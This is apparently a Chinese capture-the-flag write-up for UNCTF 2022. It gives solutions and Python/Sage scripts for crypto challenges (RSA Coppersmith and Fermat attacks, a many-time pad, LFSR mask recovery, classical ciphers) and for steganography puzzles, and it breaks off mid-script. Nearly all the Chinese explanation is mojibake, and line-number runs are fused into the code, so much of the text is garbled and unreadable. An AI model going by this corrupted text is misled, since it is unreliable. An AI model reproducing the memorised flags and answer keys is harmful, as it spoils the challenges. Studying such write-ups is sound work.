876927216FC731261B6C3A749A626EA002811D85E0E2D071F4A3090Eï¼Œä»¥åŠkeyå€¼ UnCtF2022ï¼Œ ä½¿ç”¨Cyberchefå¾—åˆ°flagæ˜æ–‡ï¼šunctf&#123;Ru5t_Rc4_1s_2_e@zy!!!&#125;ã€‚ â€‹ ezast ä½ ä¼šastå— JavaScriptæŠ½è±¡è¯­æ³•æ ‘ï¼ˆASTï¼‰ï¼Œå®šä½å¯†æ–‡ OTYN\\\\\\\\a[inE+iEl.hcEo)ivo+gï¼Œä¸”ä¸­é—´è¿ç®—åŒ…å«å¼‚æˆ–æ“ä½œï¼Œå°è¯•ä½¿ç”¨Cyberchefå¼‚æˆ–çˆ†ç ´ï¼Œå‘ç°åœ¨key=0x1aæ—¶ï¼Œå¾—åˆ°flagï¼šUNCTF&#123;Ast_1s_v4ry_u3slu1&#125;ã€‚ â€‹ HUAQIANGæ·±è‚²æ¯åŸé¢˜ ç”Ÿç“œè›‹å­ï¼Œå‚è€ƒå®˜æ–¹wpï¼Œä»£ç é€»è¾‘ä¸ºä¸€ä¸ªVMï¼Œé€ä½çˆ†ç ´flagæ¯ä½çš„å¯è¡Œå€¼ï¼Œå¾—åˆ°æ»¡è¶³æ¡ä»¶çš„è¾“å…¥ï¼š998bc64bbd919f27f44e5e2750644cã€‚ â€‹ # Cryptomd5-1çˆ†ç ´å¯è§å­—ç¬¦å¾—åˆ°md5è¡¨ï¼Œå†ä¾æ¬¡éå†å¯†æ–‡å–å‡ºç›¸åº”å­—ç¬¦ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455from hashlib import md5c = &#x27;&#x27;&#x27;4c614360da93c0a041b22e537de151eb8d9c307cb7f3c4a32822a51922d1ceaa0d61f8370cad1d412f80b84d143e1257b9ece18c950afbfa6b0fdbfa4ff731d3800618943025315f869e4e1f09471012f95b70fdc3088560732a5ac135644506e1671797c52e15f763380b45e841ec32c9f0f895fb98ab9159f51fd0297e236da87ff679a2f3e71d9181a67b7542122c8fa14cdd754f91cc6554c9e71929cce7e1671797c52e15f763380b45e841ec328277e0910d750195b448797616e091adcfcd208495d565ef66e7dff9f98764dac81e728d9d4c2f636f067f89cc14862cc9f0f895fb98ab9159f51fd0297e236d92eb5ffee6ae2fec3ad71c777531578f45c48cce2e2d7fbdea1afc51c7c6ad26cfcd208495d565ef66e7dff9f98764daa87ff679a2f3e71d9181a67b7542122c1679091c5a880faf6fb5e6087eb1b2dc8fa14cdd754f91cc6554c9e71929cce74a8a08f09d37b73795649038408b5f33cfcd208495d565ef66e7dff9f98764dae1671797c52e15f763380b45e841ec32c9f0f895fb98ab9159f51fd0297e236d8fa14cdd754f91cc6554c9e71929cce7cfcd208495d565ef66e7dff9f98764dac9f0f895fb98ab9159f51fd0297e236dcfcd208495d565ef66e7dff9f98764dae1671797c52e15f763380b45e841ec3245c48cce2e2d7fbdea1afc51c7c6ad261679091c5a880faf6fb5e6087eb1b2dce1671797c52e15f763380b45e841ec328f14e45fceea167a5a36dedd4bea2543c81e728d9d4c2f636f067f89cc14862cc4ca4238a0b923820dcc509a6f75849bc9f0f895fb98ab9159f51fd0297e236da87ff679a2f3e71d9181a67b7542122ccbb184dd8e05c9709e5dcaedaa0495cf&#x27;&#x27;&#x27;.split(&#x27;\\n&#x27;)s = list(range(32,127))t = &#123;&#125;for k in s: t[md5(chr(k).encode()).hexdigest()] = chr(k)flag=&#x27;&#x27;for k in c: flag += t[k]print(flag)# UNCTF&#123;e84fed028b9046fc0e8f080e96e72184&#125; â€‹ dddd1æ¢ä¸º .ï¼Œ0æ¢ä¸º -ï¼Œæ‘©æ–¯å¯†ç è§£å¯†å¾—ï¼šUNCTF&#123;Y4S_TH1S_JUST_M0RSE&#125;ã€‚ â€‹ caesarROT64å˜ç§å‡¯æ’’å¯†ç ï¼Œç”¨è„šæœ¬è¿˜åŸï¼š 123456789101112131415161718import strings = &#x27;B6vAy&#123;dhd_AOiZ_KiMyLYLUa_JlL/HY_&#125;&#x27;dic = string.ascii_uppercase+string.ascii_lowercase+string.digits+&#x27;+/&#x27;print(dic)d = ord(&#x27;U&#x27;)-ord(&#x27;B&#x27;)t = &#x27;&#x27;for i in range(len(s)): if s[i] == &#x27;&#123;&#x27; or s[i] == &#x27;&#125;&#x27; or s[i] == &#x27;_&#x27;: t += s[i] else: t += dic[(dic.index(s[i])+d)%64]print(t)# UNCTF&#123;w0w_Th1s_d1fFerent_c4eSar_&#125; â€‹ md5-2æ¯”md5-1å¤šäº†ä¸€å±‚å¼‚æˆ–æ“ä½œï¼Œè¿˜åŸå³å¯ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162from hashlib import md5c = &#x27;&#x27;&#x27;4c614360da93c0a041b22e537de151ebc1fd731c6d60040369908b4a5f309f4180fdc84bbb5ed9e207a21d5436efdcfdb48d19bb99a7e6bb448f63b75bc9238439eaf918a52fcaa5ed9195e546b021c1795d6869f32db43ff5b414de3c235514f59a054403f933c842e9c3235c136367c80b37816048952a3c0fc9780602a2fa810ecef68e945c3fe7d6accba8b329bdcad06891e0c769c7b02c228c8c2c8865470a96d253a639193530a15487fea36f470a96d253a639193530a15487fea36f4bdea6676e5335f857fa8e47249fa1d8810ecef68e945c3fe7d6accba8b329bdedbb7ab78cde98a07b9b5a2ab284bf0a44b43e07e9af05e3b9b129a287e5a8dfa641c08ed66b55c9bd541fe1b22ce5c0abed1f675819a2c0f65c9b7da8cab301738c486923803a1b59ef17329d70bbbd7e209780adf2cd1212e793ae8796ed7ca641c08ed66b55c9bd541fe1b22ce5c0a641c08ed66b55c9bd541fe1b22ce5c0636a84a33e1373324d64463eeb8e76146ec65b4ab061843b066cc2a2f16820d5a4a39b59eb036a4a8922f7142f8741148c34745bd5b5d42cb3efe381eeb88e4b5b1ba76b1d36847d632203a75c4f74e2d861570e7b9998dbafb38c4f35ba08bc464b7d495dc6019fa4a709da29fc79528eb69528cd84b73d858be0947f97b7ccdd6ac4c783a9059d11cb0910fc95d4a4b6b0ee5d5f6b24e6898997d765c487cb0762bc356c466d6b2b8f6396f2e0418547287408e2d2d8f3834fc1b90c3be982947a7d007b9854fa62efb18c9fd91f8ddafe43b36150de851c83d80bd22b0ac7b36c5f23587e285e528527d1263c8b2a0816e8af86e68825c9df0d63a2838163ce72a42cf62e6d0fdc6c96df4687e3&#x27;&#x27;&#x27;.split(&#x27;\\n&#x27;)cc = [int(k,16) for k in c]for i in range(1,len(cc)): cc[i] ^= cc[i-1] cc = [hex(k)[2:].rjust(32,&#x27;0&#x27;) for k in cc]print(cc)s=list(range(32,127))t=&#123;&#125;for k in s: t[md5(chr(k).encode()).hexdigest()]=chr(k)flag = &#x27;&#x27;for k in cc: flag += t[k]print(flag)# UNCTF&#123;a197271943ceb3c3fe98bcadf10c29d4&#125; â€‹ ezRSAå¸¸è§„RSAã€‚ 1234567891011import gmpy2n = 62927872600012424750752897921698090776534304875632744929068546073325488283530025400224435562694273281157865037525456502678901681910303434689364320018805568710613581859910858077737519009451023667409223317546843268613019139524821964086036781112269486089069810631981766346242114671167202613483097500263981460561e = 65537c = 56959646997081238078544634686875547709710666590620774134883288258992627876759606112717080946141796037573409168410595417635905762691247827322319628226051756406843950023290877673732151483843276348210800329658896558968868729658727981445607937645264850938932045242425625625685274204668013600475330284378427177504p = gmpy2.iroot(n,4)[0]f = p**3*(p-1)d = inverse_mod(e,f)m = pow(c,d,n)print(bytes.fromhex(hex(m)[2:]))# b&#x27;unctf&#123;pneum0n0ultram01cr0sc0p01cs01l01c0v0lcan0c0n010s01s&#125;&#x27; â€‹ Single tableè¯»åŠ å¯†æ–¹å¼ï¼Œæ˜æ˜¾çš„playfairå¯†ç ã€‚ æŒ‰ç…§keyæ’åˆ—å¥½å­—æ¯è¡¨ï¼Œæ‰‹åŠ¨æŠŠæ¯ä¸¤ä¸ªå­—æ¯å–å‡ºè§£å¯†åï¼Œæ’åˆ—ä¸º UNCTFGODYOUKNOWPLAYFAIRXï¼Œåœ¨é€‚å½“çš„åœ°æ–¹åŠ ç¬¦å·åˆ†å‰²å•è¯ï¼šUNCTF&#123;GOD_YOU_KNOW_PLAYFAIR&#125;ã€‚ â€‹ Multi tableå˜è¡¨ç»´å‰å°¼äºšå¯†ç ï¼Œå…ˆæ ¹æ®å‰4å­—ç¬¦ç¡®å®škeyå€¼ï¼Œå†éå†çˆ†ç ´ã€‚ 1234567891011121314151617181920212223242526272829303132333435from string import ascii_uppercasebase_table = [&#x27;J&#x27;, &#x27;X&#x27;, &#x27;I&#x27;, &#x27;S&#x27;, &#x27;E&#x27;, &#x27;C&#x27;, &#x27;R&#x27;, &#x27;Z&#x27;, &#x27;L&#x27;, &#x27;U&#x27;, &#x27;K&#x27;, &#x27;Q&#x27;, &#x27;Y&#x27;, &#x27;F&#x27;, &#x27;N&#x27;, &#x27;V&#x27;, &#x27;T&#x27;, &#x27;P&#x27;, &#x27;O&#x27;, &#x27;G&#x27;, &#x27;A&#x27;, &#x27;H&#x27;, &#x27;D&#x27;, &#x27;W&#x27;, &#x27;M&#x27;, &#x27;B&#x27;]table=&#123;&#125;for i in range(26): table[i]=ascii_uppercase[i:]+ascii_uppercase[:i]ori = &#x27;UNCT&#x27;res = &#x27;SDCG&#x27;key = []for i in range(4): for k,v in table.items(): if v[base_table.index(ori[i])] == res[i]: key.append(k) breakprint(key)c = &#x27;SDCGW&#123;MPN_VHG_AXHU_GERA_SM_EZJNDBWN_UZHETD&#125;&#x27;flag = &#x27;&#x27;x = 0for i in range(len(c)): if c[i] in ascii_uppercase: now = table[key[x%4]].index(c[i]) flag += base_table[now] x += 1 else: flag += c[i]print(flag)# [9, 15, 23, 16]# UNCTF&#123;WOW_YOU_KNOW_THIS_IS_VIGENERE_CIPHER&#125; â€‹ babyRSAæ³„éœ² $m$ é«˜ä½çš„Coppersmithæ”»å‡»ã€‚ 1234567891011121314n = 25300208242652033869357280793502260197802939233346996226883788604545558438230715925485481688339916461848731740856670110424196191302689278983802917678262166845981990182434653654812540700781253868833088711482330886156960638711299829638134615325986782943291329606045839979194068955235982564452293191151071585886524229637518411736363501546694935414687215258794960353854781449161486836502248831218800242916663993123670693362478526606712579426928338181399677807135748947635964798646637084128123883297026488246883131504115767135194084734055003319452874635426942328780711915045004051281014237034453559205703278666394594859431c = 15389131311613415508844800295995106612022857692638905315980807050073537858857382728502142593301948048526944852089897832340601736781274204934578234672687680891154129252310634024554953799372265540740024915758647812906647109145094613323994058214703558717685930611371268247121960817195616837374076510986260112469914106674815925870074479182677673812235207989739299394932338770220225876070379594440075936962171457771508488819923640530653348409795232033076502186643651814610524674332768511598378284643889355772457510928898105838034556943949348749710675195450422905795881113409243269822988828033666560697512875266617885514107e = 6 mbar = 11941439146252171444944646015445273361862078914338385912062672317789429687879409370001983412365416202240kbits = 60nbits = n.nbits()print(&quot;upper &#123;&#125; bits of &#123;&#125; bits is given&quot;.format(nbits - kbits, nbits))PR.&lt;x&gt; = PolynomialRing(Zmod(n))f = (mbar + x)^e - cx0 = f.small_roots(X=2^kbits, beta=0.4)[0] # find root &lt; 2^kbits with factor = nm = mbar + x0print(bytes.fromhex(hex(m)[2:]))# b&#x27;UNCTF&#123;27a0aac7-76cb-427d-9129-1476360d5d1b&#125;&#x27; â€‹ easy_RSAæ³„éœ² $p$ é«˜ä½çš„Coppersmithæ”»å‡»ã€‚ 12345678910111213141516171819c = 6423951485971717307108570552094997465421668596714747882611104648100280293836248438862138501051894952826415798421772671979484920170142688929362334687355938148152419374972520025565722001651499172379146648678015238649772132040797315727334900549828142714418998609658177831830859143752082569051539601438562078140n = 102089505560145732952560057865678579074090718982870849595040014068558983876754569662426938164259194050988665149701199828937293560615459891835879217321525050181965009152805251750575379985145711513607266950522285677715896102978770698240713690402491267904700928211276700602995935839857781256403655222855599880553p4 = 8183408885924573625481737168030555426876736448015512229437332241283388177166503450163622041857e = 0x10001pbits = 512kbits = 200print(p4.nbits())p4 = p4 &lt;&lt; kbitsPR.&lt;x&gt; = PolynomialRing(Zmod(n))f = x + p4roots = f.small_roots(X=2^kbits, beta=0.4)p = p4+int(roots[0]) q = n//pf = (p-1)*(q-1)d = inverse_mod(e,f)m = pow(c,d,n)print(bytes.fromhex(hex(m)[2:]))# flag&#123;It is a very_intersting_test!!!&#125; â€‹ ezxor ä½ çŸ¥é“å¤šæ¬¡ä¸€å¯†å—ï¼Ÿ å¤šæ¬¡ä¸€å¯†ï¼ˆMTPï¼‰æ”»å‡»ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152# python2import stringimport collectionsimport sets, sysciphers = &#x27;&#x27;&#x27;1c2063202e1e795619300e164530104516182d28020005165e01494e0d2160631d325b3b421c310601453c190814162d37404510041b55490d5d3060631d325b3e59033a1252102c560207103b22020613450549444f5d3420277421122f55067f1207152f19170659282b090b56121701405318212626742b1434551b2b4105007f110c041c7f361c451e0a02440d010a75222a22230877102137045212300409165928264c091f131701484f5d21272d33661237441a7f005215331706175930254c0817091b4244011c303c2674311e795e103a05520d300600521831274c031f0b160148555d3c3d63232909355455300752033a17175e59372c1c0056111d01474813752b22272f1e2b10063e0816452b1e041c593b2c02005a450649440110396e2f3d201e795f137f07130c2b1e450510332f4c08170e17014d481b&#x27;&#x27;&#x27;.split(&#x27;\\n&#x27;)def strxor(a, b): return &quot;&quot;.join([chr(ord(x) ^ ord(y)) for (x, y) in zip(a, b)])def target_fix(target_cipher): print &#x27;-------begin-------&#x27; final_key = [None]*150 known_key_positions = set() for current_index, ciphertext in enumerate(ciphers): counter = collections.Counter() for index, ciphertext2 in enumerate(ciphers): if current_index != index: for indexOfChar, char in enumerate(strxor(ciphertext.decode(&#x27;hex&#x27;), ciphertext2.decode(&#x27;hex&#x27;))): if char in string.printable and char.isalpha(): counter[indexOfChar] += 1 knownSpaceIndexes = [] for ind, val in counter.items(): if val &gt;= 7: knownSpaceIndexes.append(ind) xor_with_spaces = strxor(ciphertext.decode(&#x27;hex&#x27;),&#x27; &#x27;*150) for index in knownSpaceIndexes: final_key[index] = xor_with_spaces[index].encode(&#x27;hex&#x27;) known_key_positions.add(index) final_key_hex = &#x27;&#x27;.join([val if val is not None else &#x27;00&#x27; for val in final_key]) output = strxor(target_cipher.decode(&#x27;hex&#x27;),final_key_hex.decode(&#x27;hex&#x27;)) print &quot;Fix this sentence:&quot; print &#x27;&#x27;.join([char if index in known_key_positions else &#x27;*&#x27; for index, char in enumerate(output)])+&quot;\\n&quot; print &#x27;------end------&#x27; for i in ciphers: target_fix(i) è¡¥å…¨å¯èƒ½çš„æ˜æ–‡å•è¯ï¼Œåå¤å°è¯•å¾—åˆ°keyï¼šUNCTF&#123;Y0u_are_very_Clever!!!&#125;ã€‚ â€‹ ä»Šæ™šåƒä»€ä¹ˆ å…¨éƒ¨å¤§å†™ 10000 æ¢ Aï¼Œ00000 æ¢ Bï¼ŒåŸ¹æ ¹å¯†ç è§£å¾— CRYPROISFUNã€‚ â€‹ Today_is_Thursday_V_me_50æŒ‰ä»£ç é€»è¾‘è¿˜åŸå³å¯ã€‚ 1234567891011121314151617181920212223242526272829import randomimport itertoolsfrom Crypto.Util.number import *from Crypto.Util.strxor import strxorname = &quot;unctf&quot;key1 = b&#x27;Today_is_Thursday_V_me_50&#x27;key1_num = bytes_to_long(key1)c = b&#x27;Q\\x19)T\\x18\\x1b(\\x03\\t^c\\x08QiF&gt;Py\\x124DNg3P&#x27;random.seed(key1_num)message = b&#x27;&#x27;for i in c: temp_num = random.randint(1,128) message += long_to_bytes(temp_num ^ i)guess = [i for i in itertools.permutations(name, 5)]for i in range(4): what = guess.pop(50)name = &#x27;&#x27;.join(j for j in what)mask = strxor(5*name.encode(),key1)print(mask)out = strxor(mask,message)print(out)# b&#x27;unctf&#123;1_l0ve_Thurs4Ay!!!&#125;&#x27; â€‹ Fermatå·²çŸ¥ $g+x=x \\cdot p$ï¼Œåˆ™ $g=x(p-1)$ï¼Œç»“åˆè´¹é©¬å°å®šç†ï¼Œæœ‰ $a^g \\bmod p = a^{ x(p-1)} \\bmod p = (a^x)^{(p-1)} \\bmod p = 1$ ï¼ˆ$a$ ä¸ºä»»æ„æ•´æ•°ï¼‰ å– $a=2$ï¼Œå³ $2^g \\bmod p = 1$ï¼Œ$2^g-1=k_1p$ï¼Œ è€Œ $2^g \\bmod p = (2^g \\bmod n) \\bmod p=1$ï¼Œåˆ™ $2^g \\bmod n = 1+k_2p$ï¼Œ æ•… $(2^g \\bmod n)-1=k_2p$ ä¹Ÿæ˜¯ $p$ çš„å€æ•°ï¼Œåˆ™æœ‰ $p=\\gcd\\Big((2^g \\bmod n)-1,n\\Big)$ã€‚ 12345678910111213n = 19793392713544070457027688479915778034777978273001720422783377164900114996244094242708846944654400975309197274029725271852278868848866055341793968628630614866044892220651519906766987523723167772766264471738575578352385622923984300236873960423976260016266837752686791744352546924090533029391012155478169775768669029210298020072732213084681874537570149819864200486326715202569620771301183541168920293383480995205295027880564610382830236168192045808503329671954996275913950214212865497595508488636836591923116671959919150665452149128370999053882832187730559499602328396445739728918488554797208524455601679374538090229259c = 388040015421654529602726530745444492795380886347450760542380535829893454552342509717706633524047462519852647123869277281803838546899812555054346458364202308821287717358321436303133564356740604738982100359999571338136343563820284214462840345638397346674622692956703291932399421179143390021606803873010804742453728454041597734468711112843307879361621434484986414368504648335684946420377995426633388307499467425060702337163601268480035415645840678848175121483351171989659915143104037610965403453400778398233728478485618134227607237718738847749796204570919757202087150892548180370435537346442018275672130416574430694059g = 28493930909416220193248976348190268445371212704486248387964331415565449421099615661533797087163499951763570988748101165456730856835623237735728305577465527656655424601018192421625513978923509191087994899267887557104946667250073139087563975700714392158474439232535598303396614625803120915200062198119177012906806978497977522010955029535460948754300579519507100555238234886672451138350711195210839503633694262246536916073018376588368865238702811391960064511721322374269804663854748971378143510485102611920761475212154163275729116496865922237474172415758170527875090555223562882324599031402831107977696519982548567367160e = 0x10001p = gcd(pow(2,g,n)-1,n)q = n//pf = (p-1)*(q-1)d = inverse_mod(e,f)m = pow(c,d,n)print(bytes.fromhex(hex(m)[2:]))# b&#x27;UNCTF&#123;DO_y0u_Fermat_1ittle_theOrem&#125;&#x27; â€‹ è¶…çº§åŠ å€æ ¹æ®â€åŠ å€â€œï¼Œè„‘æ´å¤§çŒœå°æŒ‡æ•° $e$ æ”»å‡»ï¼Œå¼€æ–¹å³å¯ã€‚ 123456import gmpy2c=364948328635256862807658970246807356738683637564484151183420122283833769442806688034764747801289594899501872549412387392353830842750341246881725380294423193634163908298756097744423833369487321345708403908358587818931161805853745707954962941881920962518131654701890269025702523666873057795301975752113492236398361724355733200822450695761m=gmpy2.iroot(c,4)[0]print(bytes.fromhex(hex(m)[2:]))# b&#x27;flag&#123;it_is_much_bigger_than_before&#125;&#x27; â€‹ EZcry æç¤º1ï¼šæµå¯†ç  å¯†æ–‡ï¼šdd9f58b37289edc2c40133ab9f0439c140aafe7cfd501f8c3d79b1856c9bda598ce34a02a57cï¼Œ keyï¼š12345678 æ ¹æ®æç¤ºæµ‹è¯•å¸¸è§æµå¯†ç ï¼ŒRC4æˆåŠŸè§£å‡º flag&#123;83e429d991d24c548b9dbd256975d0d5&#125;ã€‚ â€‹ easy_lfsr ä½ èƒ½æ±‚å‡ºæˆ‘çš„maskå— æ ¹æ®512çº§LFSRè¿ç»­1024ä¸ªbitçš„äº§å‡ºï¼Œæ±‚æ©ç ã€‚ ç”±äºLFSRçš„æ€§è´¨ï¼Œæ¯ä¸€æ¬¡ç”Ÿæˆçš„bitéƒ½ä¼šåŠ åˆ°å‘é‡çš„æœ€ä½ä½ï¼ŒåŒæ—¶ä¸¢å¼ƒæ‰æœ€é«˜ä½bitã€‚äºæ˜¯åœ¨è¿ç»­512æ¬¡ç”Ÿæˆä¹‹åï¼ŒåŸæœ‰çš„ KEY æ‰€æœ‰çš„ä½éƒ½è¢«ä¸¢å¼ƒï¼ŒLFSRçš„çŠ¶æ€ä¼šè½¬ä¸ºå·²çŸ¥çš„512ä¸ªbitï¼Œå³æ‰€ç»™å‡ºçš„ä¸²çš„å‰512ä½ã€‚ä¹‹åå®Œå…¨çŸ¥é“äº†LFSRçš„çŠ¶æ€ï¼Œåªéœ€è¦åœ¨å·²çŸ¥çŠ¶æ€çš„æƒ…å†µä¸‹æ¨å‡ºæ©ç ã€‚ æ¯è¿ç»­512ä¸ªbitå¯ä»¥ç”Ÿæˆä¸‹ä¸€ä¸ªbitã€‚å·²çŸ¥è¿™512ä¸ª bitï¼Œä¹ŸçŸ¥é“ä¸‹ä¸€ä¸ªbitï¼Œä½†æ©ç æœªçŸ¥ã€‚é—®é¢˜ç­‰ä»·äºï¼šåœ¨ $\\text{GF}(2)$ ä¸Šï¼Œ512ä½çš„å·²çŸ¥çš„çŠ¶æ€å‘é‡ï¼Œç‚¹ä¹˜512ä½çš„æ©ç å‘é‡ï¼Œå¾—åˆ°çš„æ•°å·²çŸ¥ï¼Œæ±‚æ©ç å‘é‡ã€‚çŠ¶æ€å‘é‡æœ‰512ç»´ï¼Œåˆ™æœ‰512ç»„æ–¹ç¨‹ã€‚ è§£æ–¹ç¨‹ç»„çš„é—®é¢˜è½¬åŒ–ä¸ºçŸ©é˜µæ±‚é€†é—®é¢˜ã€‚æŠŠLFSRçŠ¶æ€é€è¡Œå†™åœ¨çŸ©é˜µä¸Šï¼Œå½¢æˆçš„çŸ©é˜µè®°ä¸º $M$ï¼ŒæŠŠLFSRæ¯æ¬¡æ‰€ç”Ÿæˆçš„ç»“æœæ‹¼æˆçš„å‘é‡è®°ä¸º $T$ï¼Œåˆ™æ©ç å‘é‡ $v$ æœ‰ï¼š$M \\cdot v = T$ï¼Œå³ $v=M^{-1} \\cdot T$ã€‚ 123456789101112131415161718192021222324import itertoolsr1 = 1261758973831852037364036680281442789461569523587512977925542995725854499352478233840720068310447535900840104847512878006505600998481136843381903570688446r2 = 1563853949934744587783542352813857485182445023523734908403585490477271641971239139925690033798570364214960692427704824920072270819031456154655408096237757def test(): s = [int(x) for x in bin(r1)[2:].rjust(512,&#x27;0&#x27;)+bin(r2)[2:].rjust(512,&#x27;0&#x27;)] M = matrix(GF(2), 512, 512) T = vector(GF(2), 512) for i in range(len(s) - 512): M[i] = s[i : i + 512] T[i] = s[i+512] try: mask = M.inverse() * T return int(&#x27;&#x27;.join(map(str, (mask))),2) except: return flag = test()print(bytes.fromhex(hex(flag)[2:]))# b&quot;flag&#123;09de44be-5b3d-11ed-b764-ac1203ab14d7&#125;\\xb0vgf\\x96\\xdf`v\\xc6d@\\x14\\xf7\\x98\\xaf\\xac&#x27;\\xf8K\\xbb+\\x00&quot; â€‹ # Miscmagic_word ä¹±ç +é›¶å®½éšå†™ Wingdingså­—ä½“è½¬æ­£å¸¸å­—ä½“å¦‚å®‹ä½“ï¼Œå…¨é€‰å†…å®¹å¤åˆ¶ï¼Œé›¶å®½éšå†™å·¥å…·æå–å¾— unctf&#123;We1come_new_ctfer&#125;ã€‚ â€‹ æ‰¾å¾—åˆ°æˆ‘å—ä»¥å‹ç¼©åŒ…æ–¹å¼æ‰“å¼€docxï¼Œåœ¨document.xmlä¸­å‘ç°ï¼š &lt;w:rFonts w:hint=&quot;default&quot; w:cs=&quot;flag&#123;You_find_me!&#125;&quot; w:asciiTheme=&quot;minorAscii&quot; w:hAnsiTheme=&quot;minorAscii&quot;/&gt; â€‹ syslogåœ¨logæ–‡ä»¶ä¸­æ‰¾åˆ°å…³é”®ä¸€è¡Œï¼š Nov 2 02:34:14 ubuntu bi0x: [Password] cGFzc3dvcmQgaXMgVTZudTJfaTNfYjNTdA== base64è§£ç å¾—åˆ°å¯†ç  password is U6nu2_i3_b3Stï¼Œè§£å‹å¾—flagï¼šunctf&#123;N1_sH3_D0n9_L0g_dE!&#125; â€‹ In_the_Morse_GardenPDFä¸­å…¨é€‰å¤åˆ¶å‡ºæ–‡å­—ï¼š 1234567891011121314UNCTF&#123;5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2h546b5Y2h5be05Y2hIOS+neWPpOavlOWPpOeOm+WNoeW3tOWNoSDnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6Qg5L6d5Y+k5q+U5Y+k5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2h546b5Y2h5be05Y2h5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2hIOS+neWPpOavlOWPpOeOm+WNoeW3tOWNoSDnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6Qg5L6d5Y+k5q+U5Y+k5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2h546b5Y2h5be05Y2h5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2hIOeOm+WNoeW3tOWNoeeOm+WNoeW3tOWNoSDkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaEg546b5Y2h5be05Y2h5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2hIOS+neWPpOavlOWPpOeOm+WNoeW3tOWNoSDkvp3lj6Tmr5Tlj6Tkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaHnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaEg546b5Y2h5be05Y2h5L6d5Y+k5q+U5Y+k5L6d5Y+k5q+U5Y+k5L6d5Y+k5q+U5Y+kIOS+neWPpOavlOWPpOeOm+WNoeW3tOWNoSDnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaEg5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2hIOS+neWPpOavlOWPpOeOm+WNoeW3tOWNoSDkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaEg5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2hIOS+neWPpOavlOWPpOeOm+WNoeW3tOWNoSDnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaHnjpvljaHlt7TljaE=&#125; ä¸­é—´éƒ¨åˆ†base64è§£ç å¾—åˆ°çš„ ä¾å¤æ¯”å¤ æ¢ä¸º .ï¼Œç›å¡å·´å¡ æ¢ä¸º -ï¼Œå†æ‘©æ–¯å¯†ç è§£å¾— WAN_AN_MAKA_BAKAAAAA!ã€‚ â€‹ æ¸…å’Œfan å°wä¸€ç›´å¯¹çœŸäººäºŒæ¬¡å…ƒæ²¡å•¥æŠµæŠ—åŠ›ï¼Œå½“ä»–è§åˆ°æ¸…å’Œçš„æ—¶å€™ï¼Œå°wç›´å‘¼è¿™å°±æ˜¯å¿ƒåŠ¨çš„æ„Ÿè§‰ã€‚ ç¬¬ä¸€å±‚ï¼Œæ ¹æ®å‹ç¼©åŒ…æ³¨é‡Šï¼Œå¯†ç ä¸ºæ¸…å’ŒBç«™uidä¸‹åˆ’çº¿æœ€é«˜æ’­æ”¾é‡è§†é¢‘å‘å¸ƒæ—¥æœŸï¼Œæ‰¾åˆ°å¯†ç  836885_2022/05/20ï¼› ç¬¬äºŒå±‚ï¼Œpngå›¾ç‰‡LSBéšå†™ï¼Œæå–å‡º password is :qq857488580ï¼› ç¬¬ä¸‰å±‚ï¼ŒéŸ³é¢‘æ–‡ä»¶SSTVï¼Œå¾—åˆ°å›¾ç‰‡ä¸­å¯†ç  V@mpir3ï¼› æœ€åä¸€å±‚ï¼Œæ–‡æœ¬å†…é›¶å®½éšå†™ï¼Œç”¨åœ¨çº¿å·¥å…·æå–å¾—åˆ° unctf&#123;wha1e_wants_a_girlfriend_like_alicia&#125;ã€‚ â€‹ èŠéº»å¼€é—¨å¸¦å¯†ç çš„LSBéšå†™ï¼špython2 lsb.py extract flag.png xxx.txt key1 flag: flag&#123;faf5bdd5-ba3d-11da-ad31-d33d75182f1b&#125; â€‹ æˆ‘å°å¿ƒæµ·ä¹Ÿç»éé³ç±»pngå›¾ç‰‡ä¸­æœ‰å­—ç¬¦ä¸² F#S&lt;YIcHnAG;ï¼Œbase92è§£ç  flaginmd5ï¼›å°¾éƒ¨ RUFTWUxTQg==ï¼Œbase64è§£ç  EASYLSBã€‚ zstegæŸ¥çœ‹ä¸åˆ°æœ‰ç”¨ä¿¡æ¯ï¼Œç”¨cloaked-pixelå¸¦å¯†ç çš„LSBæå–ï¼špython2 lsb.py extract 1.png out.txt flaginmd5ï¼Œå¾—åˆ°ï¼š 18FA14CDD754F91CC6554C9E71929CCE72DB95E8E1A9267B7A1188556B2013B330CC175B9C0F1B6A831C399E269772661B2F5FF47436671B6E533D8DC3614845DF95B70FDC3088560732A5AC135644506F1290186A5D0B1CEAB27F4E77C0C5D68E1671797C52E15F763380B45E841EC322DB95E8E1A9267B7A1188556B2013B334A8A08F09D37B73795649038408B5F33D95679752134A2D9EB61DBD7B91C4BCC6F8F57715090DA2632453988D9A1501BE1671797C52E15F763380B45E841EC32B14A7B8059D9C055954C92674CE60032E358EFA489F58062F10DD7316B65649ED95679752134A2D9EB61DBD7B91C4BCCB14A7B8059D9C055954C92674CE600326F8F57715090DA2632453988D9A1501B865C0C0B4AB0E063E5CAA3387C1A874103C7C0ACE395D80182DB07AE2C30F0344A8A08F09D37B73795649038408B5F33CBB184DD8E05C9709E5DCAEDAA0495CF æ ¹æ®å‰é¢çš„æç¤ºï¼Œè¿™ä¸²å­—ç¬¦ä¸²ä¸ºmd5å€¼çš„ç»„åˆï¼Œçˆ†ç ´ï¼š 12345678910111213141516from hashlib import md5s = 